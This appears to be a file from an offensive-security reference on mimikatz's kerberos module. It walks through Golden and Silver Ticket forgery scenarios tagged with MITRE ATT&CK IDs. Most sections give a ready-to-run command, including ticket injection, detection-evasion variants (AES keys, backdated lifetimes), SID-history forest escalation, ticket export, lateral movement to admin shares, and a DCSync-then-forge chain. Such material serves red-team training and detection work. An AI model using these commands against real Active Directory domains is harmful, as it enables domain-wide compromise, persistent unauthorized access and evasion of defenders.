# Mimikatz — kerberos (Golden/Silver Ticket) — Hands-On Use Cases

Every scenario below builds on the same core mechanic documented in `01 - Overview.md` §How It Works — a `.kirbi` built entirely offline via `kuhl_m_kerberos_golden_data()`, then either written to disk or injected via `KerbSubmitTicketMessage`. What changes is *which key* was used, *what* the ticket claims to be, and *how* it's delivered into a session. MITRE ATT&CK IDs are tagged per scenario; where no dedicated sub-technique exists, that's stated explicitly rather than forced.

## Contents
- [Golden Ticket for Domain-Wide Persistence](#golden-ticket-for-domain-wide-persistence)
- [Forge and Inject in One Step](#forge-and-inject-in-one-step)
- [Forge With AES Key Material to Avoid the RC4 Signal](#forge-with-aes-key-material-to-avoid-the-rc4-signal)
- [Cross-Domain/Forest Golden Ticket via SID History](#cross-domainforest-golden-ticket-via-sid-history)
- [RODC-Scoped Golden Ticket](#rodc-scoped-golden-ticket)
- [Silver Ticket for a File Server (CIFS)](#silver-ticket-for-a-file-server-cifs)
- [Silver Ticket for an Application Service Account](#silver-ticket-for-an-application-service-account)
- [Backdating a Forged Ticket's Start Time](#backdating-a-forged-tickets-start-time)
- [Purging the Cache Before Injection](#purging-the-cache-before-injection)
- [Listing Session Tickets](#listing-session-tickets)
- [Exporting Session Tickets for Offline Reuse](#exporting-session-tickets-for-offline-reuse)
- [Retrieving the Current Session's Real TGT](#retrieving-the-current-sessions-real-tgt)
- [Requesting an Arbitrary TGS](#requesting-an-arbitrary-tgs)
- [Deriving Kerberos Keys From a Known Password](#deriving-kerberos-keys-from-a-known-password)
- [Pass-the-Ccache From a Linux/Impacket Toolchain](#pass-the-ccache-from-a-linuximpacket-toolchain)
- [Fleet-Wide Lateral Movement With a Single Forged Ticket](#fleet-wide-lateral-movement-with-a-single-forged-ticket)
- [Chained: DCSync → Forge → Inject](#chained-dcsync--forge--inject)

---

## Golden Ticket for Domain-Wide Persistence

**MITRE ATT&CK:** [T1558.001](https://attack.mitre.org/techniques/T1558/001/) (Steal or Forge Kerberos Tickets: Golden Ticket)

```
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:aad3b435b51404eeaad3b435b51404ee /ticket:golden.kirbi
```
The canonical call. `/user:evil` need not exist in AD — the 20-minute rule (`01 - Overview.md`) means the KDC won't check. Default `/id:500` and the default group set (513/512/520/518/519) forge Domain Admin-equivalent rights. Writes `golden.kirbi` to disk rather than injecting immediately — useful when the ticket needs to be moved to a different machine (or a different tool, e.g. Rubeus or Impacket's `ticketer.py`, both of which can consume the same `.kirbi`/ccache formats) before use.

## Forge and Inject in One Step

**MITRE ATT&CK:** T1558.001, plus [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Use Alternate Authentication Material: Pass the Ticket) for the injection itself

```
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /aes256:8f3a...<32-byte hex>... /ptt
```
`/ptt` skips the `.kirbi` file entirely — the forged ticket goes straight from `kuhl_m_kerberos_golden_data()`'s output into `kuhl_m_kerberos_ptt_data()`, injected into the current session. No file ever touches disk (`03 - Source Evidence.md`'s dropped-artifact discussion is moot for this variant), and the operator is immediately authenticated as the forged identity in their current shell.

## Forge With AES Key Material to Avoid the RC4 Signal

**MITRE ATT&CK:** T1558.001

```
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /aes256:8f3a...<64 hex chars>... /ticket:golden_aes.kirbi
```
Functionally identical to the RC4/NTLM variant, but the resulting ticket's encryption type is `KERB_ETYPE_AES256_CTS_HMAC_SHA1_96` instead of `KERB_ETYPE_RC4_HMAC_NT`. This specifically defeats the "encryption downgrade" detection class (`05 - Detection and Hunting.md`) — a modern, AES-only domain where an operator only has the krbtgt's NTLM hash (not its AES key, which requires a separate DCSync flow or its own derivation) cannot use this evasion; obtaining the AES key specifically, not just the NTLM hash, is the actual prerequisite.

## Cross-Domain/Forest Golden Ticket via SID History

**MITRE ATT&CK:** T1558.001 — no dedicated ATT&CK sub-technique exists for SID-history injection specifically; it's an extension of the same forgery, not a separate technique

```
mimikatz # kerberos::golden /user:evil /domain:child.corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:<child domain's krbtgt hash> /sids:S-1-5-21-9999999999-8888888888-7777777777-519 /ptt
```
The forged ticket is still built from the **child** domain's krbtgt key (a compromised child domain's krbtgt is all that's needed here), but `/sids` injects the **parent** (or a trusted forest's) domain SID + RID `519` (Enterprise Admins) into the PAC's SID-history field. The child domain's own DC copies that SID list forward into the TGS-REP exactly as it does the rest of the PAC — the ticket's bearer inherits Enterprise Admin rights across the entire forest without ever authenticating to the parent domain. This is precisely why a single child domain's krbtgt compromise is treated as a forest-wide incident, not a domain-scoped one; **SID filtering/quarantine** on the trust is the relevant mitigating control, covered alongside `lsadump::trust` in `lsadump (DCSync)/`.

## RODC-Scoped Golden Ticket

**MITRE ATT&CK:** T1558.001, cross-referencing Microsoft's own "Kerberos key list attack" alert family (`04`/`05`)

```
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /krbtgt:<RODC krbtgt hash> /rodc:501 /ptt
```
`/rodc:<id>` sets the forged ticket's key-version number to `(1 | rodc_id << 16)` instead of the hardcoded default, marking it as issued by/for a specific Read-Only Domain Controller's own krbtgt account (RODCs maintain a separate krbtgt account from the writable-DC krbtgt, scoped by the RODC's Password Replication Policy). This variant underlies what Microsoft's alert documentation calls a **Kerberos key list attack** — forging an RODC-scoped ticket and using it to prompt the KDC into revealing a targeted account's long-term key via a specially crafted TGS request.

## Silver Ticket for a File Server (CIFS)

**MITRE ATT&CK:** [T1558.002](https://attack.mitre.org/techniques/T1558/002/) (Steal or Forge Kerberos Tickets: Silver Ticket)

```
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /rc4:<FILESRV01$'s NTLM hash> /service:cifs /target:filesrv01.corp.local /ptt
```
No krbtgt hash involved at all — `/rc4` here is the target computer account's **own** machine-account hash. `/service:cifs` sets the ticket's service class; the ticket is **not** flagged `initial` (`01 - Overview.md`), and it never touches a DC at any point in its use — it goes directly to `filesrv01.corp.local` via `AP-REQ`, granting SMB/file-share access as the forged identity to that one host only. The narrowest-scope, quietest-network-footprint variant of this entire module.

## Silver Ticket for an Application Service Account

**MITRE ATT&CK:** T1558.002

```
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /rc4:<svc-mssql's NTLM hash> /service:mssqlsvc /target:sql01.corp.local:1433 /ptt
```
Identical mechanism, different service class and a **service account's** hash rather than a computer account's — many high-value services (SQL Server, custom line-of-business apps registering their own SPNs) run under a domain service account rather than the machine's own computer-account identity. Recovering that account's hash (via `sekurlsa`/DCSync against the service account, not the computer account) and forging a Silver Ticket for its exact SPN grants direct application-layer access — e.g. `sqlcmd`/database-client authentication as the forged principal — bypassing whatever the application's own authorization model would otherwise require of an anonymous or lower-privileged caller.

## Backdating a Forged Ticket's Start Time

**MITRE ATT&CK:** T1558.001/T1558.002 (evasion variant of the same forgery — no dedicated ATT&CK ID for the timing manipulation itself)

```
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /rc4:<krbtgt hash> /startoffset:-30 /endin:600 /renewmax:10080 /ptt
```
`/startoffset:-30` backdates the ticket's start time 30 minutes into the past; `/endin:600` and `/renewmax:10080` set the expiry/renewal window to match Active Directory's own **default** Kerberos policy (10 hours = 600 minutes; 7 days = 10,080 minutes) instead of mimikatz's ~10-year default. This directly defeats the "time anomaly" detection class (`05 - Detection and Hunting.md`) at the cost of the ticket expiring on a realistic schedule rather than lasting a decade — a deliberate operational tradeoff between stealth and persistence duration.

## Purging the Cache Before Injection

**MITRE ATT&CK:** T1550.003 (supporting step for pass-the-ticket)

```
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /rc4:<krbtgt hash> /ptt
```
`kerberos::purge` clears every ticket already in the current session's cache first. Without this, Windows may still prefer an existing, legitimately-cached ticket for a given SPN over the freshly-injected forged one when both are present — purging first guarantees the forged ticket is what actually gets used on the next resource access.

## Listing Session Tickets

**MITRE ATT&CK:** No dedicated sub-technique — this is reconnaissance/verification, not the forgery or use itself

```
mimikatz # kerberos::list
```
Verifies a prior `kerberos::ptt`/`/ptt` injection actually landed (the forged ticket appears in the listing, same as any legitimately cached ticket would), or simply enumerates what's already cached in the current session before deciding what to forge or request next. Functionally and mechanically identical to running `klist` — same underlying `KerbQueryTicketCacheExMessage` LSA call (`01 - Overview.md`).

## Exporting Session Tickets for Offline Reuse

**MITRE ATT&CK:** T1558 (Steal or Forge Kerberos Tickets — general; exporting harvested tickets is the "steal" half of the technique family)

```
mimikatz # kerberos::list /export
```
Writes every ticket currently in the session's cache — legitimate ones the current user already holds, or previously injected forged ones — out to individual `.kirbi` files, named from each ticket's flags/client/server/realm. Distinct from `sekurlsa::tickets /export`, which pulls tickets from **every** logon session visible in LSASS memory (requires the raw-memory-read privilege level); `kerberos::list /export` only ever sees the **calling process's own current session**, via the documented LSA API — see `sekurlsa (Credential Dumping)/02 - Hands-On Use Cases.md` for the broader-scope alternative.

## Retrieving the Current Session's Real TGT

**MITRE ATT&CK:** T1558 (general), feeding [T1550.003](https://attack.mitre.org/techniques/T1550/003/) for what it's typically used for next

```
mimikatz # kerberos::tgt
```
Displays the current session's actual TGT, including its session key — but **only if `allowtgtsessionkey=1`** is set under `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters` (source explicitly checks for and warns about an all-zero key otherwise: `"Session key is NULL! It means allowtgtsessionkey is not set to 1"`). A recovered session key feeds ticket-relay/overpass-the-hash-adjacent workflows where the operator needs to prove possession of the TGT's session key, not just present the ticket itself.

## Requesting an Arbitrary TGS

**MITRE ATT&CK:** T1558 (general); feeds [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (Kerberoasting) when the target SPN belongs to a Kerberoastable account

```
mimikatz # kerberos::ask /target:cifs/filesrv01.corp.local
mimikatz # kerberos::ask /target:MSSQLSvc/sql01.corp.local:1433 /aes256 /export
```
Not a forgery — this uses the current session's own legitimate TGT to request a real, DC-issued TGS for the named SPN, exactly as any Kerberos-aware application would when accessing that resource. Included in this module's coverage because it's the same primitive Kerberoasting-style tooling (Rubeus's `kerberoast`, Impacket's `GetUserSPNs.py`) is built on: request TGS tickets for SPN-registered accounts, then attack the returned ticket's encrypted portion offline. `/export` additionally saves the raw `.kirbi`.

## Deriving Kerberos Keys From a Known Password

**MITRE ATT&CK:** T1558 (general, supporting) — no dedicated sub-technique for offline key derivation itself

```
mimikatz # kerberos::hash /password:Summer2026! /user:evil /domain:corp.local
```
Purely a local cryptographic derivation — no network activity, no target-host interaction. Useful when a plaintext password (not a hash) was recovered by some other means (phishing, a config file, `sekurlsa::wdigest`) and the operator needs the corresponding RC4/AES128/AES256/DES Kerberos keys, e.g. to construct a legitimate-looking (non-forged) authentication rather than reuse a raw NTLM hash directly.

## Pass-the-Ccache From a Linux/Impacket Toolchain

**MITRE ATT&CK:** T1550.003

```
mimikatz # kerberos::ptc /tmp/evil.ccache
```
Imports an MIT/Heimdal-format ticket cache — the format Linux Kerberos tooling (`kinit`, Impacket's `ticketer.py`/`getTGT.py`) natively produces — directly into the current Windows LSA session, converting the format internally rather than requiring a separate `.kirbi` conversion step first. Relevant for cross-platform operations where a ticket was forged or obtained on a Linux pivot host and needs to be used from a Windows session, or vice versa (`kerberos::clist` performs the read-only equivalent — listing without importing).

## Fleet-Wide Lateral Movement With a Single Forged Ticket

**MITRE ATT&CK:** T1558.001, chaining into whatever lateral-movement technique the ticket is then used for (e.g. [T1021.002](https://attack.mitre.org/techniques/T1021/002/) SMB/Windows Admin Shares if used with `Impacket/psexec/`)

```
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /rc4:<krbtgt hash> /ptt

# The SAME forged ticket now authenticates the operator's current session to any
# Kerberos-speaking service the forged group memberships would legitimately reach —
# no per-host re-forging needed:
dir \\dc01.corp.local\c$
dir \\fileserver02.corp.local\c$
winrs -r:sql01.corp.local cmd
```
Unlike host-specific lateral-movement tooling (`Impacket/psexec/`, `Metasploit PsExec/`), a Golden Ticket's scope is a property of the **forged identity and its group memberships**, not the ticket's target — the exact same injected ticket authenticates identically against every host in the domain that trusts Kerberos tickets signed by that krbtgt. This is what makes Golden Ticket persistence categorically different from a single-host credential theft: one forging operation grants domain-wide reach for as long as the ticket remains valid (`01 - Overview.md`'s lifetime discussion) and the krbtgt key remains unrotated.

## Chained: DCSync → Forge → Inject

**MITRE ATT&CK:** [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (DCSync) for the key-theft step, T1558.001 for the forge, T1550.003 for the injection

```
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # kerberos::golden /user:evil /domain:corp.local /sid:S-1-5-21-1111111111-2222222222-3333333333 /aes256:<key from the DCSync output above> /ptt
```
The canonical two-command chain this module is built to be the second half of: `lsadump::dcsync /user:krbtgt` (`lsadump (DCSync)/02 - Hands-On Use Cases.md`) recovers the krbtgt key over the network, entirely via legitimate-looking MS-DRSR replication traffic — no LSASS touch, no filesystem touch on the DC. `kerberos::golden /ptt` then forges and injects a ticket from that key, entirely offline. From initial DCSync rights on some already-compromised account to domain-wide persistent access, in two mimikatz commands, with no interactive logon to a Domain Controller at any point in the chain.
